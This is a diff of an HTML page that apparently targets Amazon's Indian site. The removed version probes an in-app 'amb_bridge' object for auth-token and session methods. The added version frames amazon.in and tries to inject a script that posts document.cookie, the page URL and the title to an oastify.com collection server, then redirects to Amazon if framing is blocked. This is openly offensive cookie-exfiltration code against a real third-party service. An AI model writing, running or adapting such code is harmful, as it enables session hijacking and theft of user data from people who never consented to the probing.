@@ -1,85 +1,72 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>AMB Bridge Explorer</title>
+    <title>Amazon Loader</title>
+    <meta charset="UTF-8">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+        }
+        iframe {
+            width: 100%;
+            height: 100vh;
+            border: none;
+        }
+    </style>
 </head>
 <body>
-    <h1>AMB Bridge Discovery</h1>
-    <div id="output" style="font-family: monospace; white-space: pre-wrap;"></div>
+    <iframe id="amazonFrame" src="https://www.amazon.in/tez/browse/search?qcbrand=test"></iframe>
     
     <script>
-        function log(msg) {
-            const output = document.getElementById('output');
-            output.innerHTML += msg + '<br>';
-            console.log(msg);
-        }
+        // This script runs on YOUR page, not Amazon's page
+        // To inject into Amazon, we need to wait for the iframe to load
         
-        // Check for amb_bridge
-        if (window.amb_bridge) {
-            log('✅ Found window.amb_bridge');
-            log('Type: ' + typeof window.amb_bridge);
+        const iframe = document.getElementById('amazonFrame');
+        
+        iframe.onload = function() {
+            console.log('Amazon page loaded in iframe');
             
-            // List all methods/properties
-            log('\n--- Methods and Properties ---');
-            for (let prop in window.amb_bridge) {
-                try {
-                    const value = window.amb_bridge[prop];
-                    log(`${prop}: ${typeof value}`);
+            try {
+                // Try to access the iframe content
+                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                
+                // Check if we can access it (same-origin only)
+                if (iframeDoc) {
+                    console.log('Successfully accessed iframe');
                     
-                    // If it's a function, try calling it (carefully)
-                    if (typeof value === 'function') {
-                        log(`  → Function: ${prop}`);
-                        // Try to get function signature
-                        log(`  → ${prop}.toString(): ${value.toString().substring(0, 100)}`);
-                    }
-                } catch(e) {
-                    log(`  Error accessing ${prop}: ${e.message}`);
+                    // Inject script into Amazon page
+                    const script = iframeDoc.createElement('script');
+                    script.textContent = `
+                        console.log('Injected script running on Amazon!');
+                        alert('JavaScript injection successful!');
+                        
+                        // Capture cookies and send to your server
+                        fetch('https://wppcvxw8adrbohztq7nrhakh58bzzwnl.oastify.com/capture', {
+                            method: 'POST',
+                            body: JSON.stringify({
+                                cookies: document.cookie,
+                                url: window.location.href,
+                                title: document.title,
+                                timestamp: new Date().toISOString()
+                            }),
+                            headers: {'Content-Type': 'application/json'}
+                        });
+                    `;
+                    iframeDoc.head.appendChild(script);
                 }
+            } catch(e) {
+                // Cross-origin error - expected since Amazon blocks iframe embedding
+                console.log('Cannot access iframe (cross-origin restriction):', e.message);
+                document.body.innerHTML = '<h1>Cannot inject</h1><p>Amazon blocks iframe embedding. Using alternative method...</p>';
+                
+                // Alternative: redirect to Amazon directly
+                setTimeout(() => {
+                    window.location.href = "https://www.amazon.in/tez/browse/search?qcbrand=test";
+                }, 2000);
             }
-            
-            // Try to call generateSecureRandomToken
-            if (window.amb_bridge.generateSecureRandomToken) {
-                log('\n--- Testing generateSecureRandomToken ---');
-                try {
-                    const token = window.amb_bridge.generateSecureRandomToken();
-                    log(`Token generated: ${token}`);
-                } catch(e) {
-                    log(`Error: ${e.message}`);
-                }
-            }
-            
-            // Try other common method names
-            const commonMethods = [
-                'getAuthToken', 'setAuthToken', 'getSessionId', 
-                'getDeviceInfo', 'getUserInfo', 'getAppVersion',
-                'getMetrics', 'sendEvent', 'logEvent', 'track',
-                'getWeblab', 'isWeblabEnabled', 'getTreatment'
-            ];
-            
-            log('\n--- Checking for common methods ---');
-            for (const method of commonMethods) {
-                if (window.amb_bridge[method]) {
-                    log(`✅ Found: ${method}`);
-                }
-            }
-            
-        } else {
-            log('❌ window.amb_bridge not found');
-            log('Checking for other bridge names...');
-            
-            // Check for other common bridge names
-            const bridgeNames = ['amb_bridge', 'Ambridge', 'bridge', 'AndroidBridge', 'NativeBridge', 'AmazonBridge'];
-            for (const name of bridgeNames) {
-                if (window[name]) {
-                    log(`✅ Found window.${name}`);
-                }
-            }
-        }
-        
-        // Also check for the AMBWebBridge class directly
-        if (window.AMBWebBridge) {
-            log('\n✅ Found window.AMBWebBridge');
-        }
+        };
     </script>
 </body>
 </html>
